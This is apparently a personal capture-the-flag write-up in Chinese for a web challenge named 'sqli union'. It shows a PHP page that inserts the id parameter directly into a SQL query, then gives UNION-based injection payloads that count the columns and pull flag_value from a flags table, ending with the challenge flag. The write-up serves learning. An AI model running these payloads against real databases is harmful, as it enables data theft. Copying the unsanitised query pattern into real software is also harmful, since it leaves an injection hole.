#Web 

## 題目

**sqli union**
給了一個網址，點開來
![[W1-23_web.png|center|434]]
點 `Source Code`，簡化：
```php
<?php
	include 'config.php';
	
	if (isset($_GET['sauce'])) {
	  show_source(__FILE__);
	  die();
	}
	
	$id = $_GET['id'] ?? 1;
	$query = "SELECT * FROM posts WHERE id = $id";
?>

---

<body>
    <h1><?php echo $post['title']; ?></h1>
    <hr>
    <p><?php echo nl2br($post['content']); ?></p>
    <a class="btn btn-secondary" href="/?sauce=true">Source Code</a>
</body>
```

---
## 解題
1. 觀察網頁：table 名稱為 `flags`，目標 column 為 `flag_value`
2. 觀察 source code 
   ```SQL
   SELECT * FROM posts WHERE id = $id
   ```
   沒有限制 id 的輸入內容 -> 可以在網址後面加上 `?id=... UNION` 
3. 取得 DB 的欄位數，輸入
   ```SQL
   ?id=-1 UNION SELECT 1;--
   ?id=-1 UNION SELECT 1, 2;--
   ?id=-1 UNION SELECT 1, 2, 3;--
    ...
   ```
    -> 發現直到 `SELECT 1, 2, 3` 才沒有報 syntax error 
   -> 總共有 3 個欄位
4. 判斷欄位對應，輸入
   ```SQL
   ?id=-1 UNION SELECT flag_value, NULL, NULL FROM flags;--
   ?id=-1 UNION SELECT NULL, flag_value, NULL FROM flags;--
   ?id=-1 UNION SELECT NULL, NULL, flag_value FROM flags;--
   ```
   試到第二個成功
5. flag = `CTF{sqli_union_web_6d309c187850d636b81e7368}`













